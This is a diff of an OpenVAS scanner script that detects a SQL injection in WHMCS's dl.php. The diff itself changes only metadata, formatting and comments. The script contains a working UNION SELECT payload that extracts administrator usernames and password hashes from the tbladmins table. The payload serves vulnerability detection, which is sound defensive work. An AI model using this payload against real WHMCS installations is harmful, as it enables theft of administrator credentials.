@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_whmcs_sql_inj_vuln.nasl 5791 2017-03-30 13:06:07Z cfi $
+# $Id: gb_whmcs_sql_inj_vuln.nasl 11082 2018-08-22 15:05:47Z mmartin $
 #
 # WHMCS SQL Injection Vulnerability
 #
@@ -27,15 +27,15 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803197");
-  script_version("$Revision: 5791 $");
+  script_version("$Revision: 11082 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-03-30 15:06:07 +0200 (Thu, 30 Mar 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-22 17:05:47 +0200 (Wed, 22 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-05-14 11:27:14 +0530 (Tue, 14 May 2013)");
   script_name("WHMCS SQL Injection Vulnerability");
 
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/121613");
-  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/whmcs-452-sql-injection");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121613");
+  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/whmcs-452-sql-injection");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
   script_family("Web application abuses");
@@ -43,16 +43,16 @@ if(description)
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
-  script_tag(name : "insight" , value : "Flaw is due to improper sanitation of user supplied input via the 'id'
+  script_tag(name:"insight", value:"Flaw is due to improper sanitation of user supplied input via the 'id'
   parameter to '/whmcs/dl.php' script.");
-  script_tag(name : "solution" , value : "Upgrade to WHMCS 5.2 or later,
+  script_tag(name:"solution", value:"Upgrade to WHMCS 5.2 or later,
   For updates refer to http://www.whmcs.com");
-  script_tag(name : "summary" , value : "This host is installed with WHMCS and is prone to sql injection
+  script_tag(name:"summary", value:"This host is installed with WHMCS and is prone to sql injection
   vulnerability.");
-  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to disclose credentials
+  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to disclose credentials
   or manipulate SQL queries by injecting arbitrary SQL code.
   Impact Level: Application");
-  script_tag(name : "affected" , value : "WHMCS version 4.5.2 and prior");
+  script_tag(name:"affected", value:"WHMCS version 4.5.2 and prior");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_app");
@@ -61,12 +61,6 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-
-## Variable Initialization
-port = "";
-req = "";
-res = "";
-url = "";
 
 port = get_http_port(default:80);
 
@@ -81,15 +75,12 @@ foreach dir (make_list_unique("/", "/whmcs", "/bill", "/support", "/management",
 
   rcvRes = http_get_cache(item:string(dir, "/index.php"), port:port);
 
-  ## confirm the WHMCS installation
   if(">WHMCompleteSolution<" >< rcvRes && "http://www.whmcs.com/" >< rcvRes)
   {
 
-    ## Construct Attack Request
     url = dir + "/dl.php?type=i&amp;id=1 and 0x0=0x1 union select 1,2,3,4," +
           "CONCAT(username,0x3a3a3a,password),6,7 from tbladmins --";
 
-    ## Try attack and check the response to confirm vulnerability
     if(http_vuln_check(port:port, url:url, check_header:TRUE,
        pattern:"filename=*.pdf", extra_check:make_list('CreationDate',
        'ViewerPreferences')))
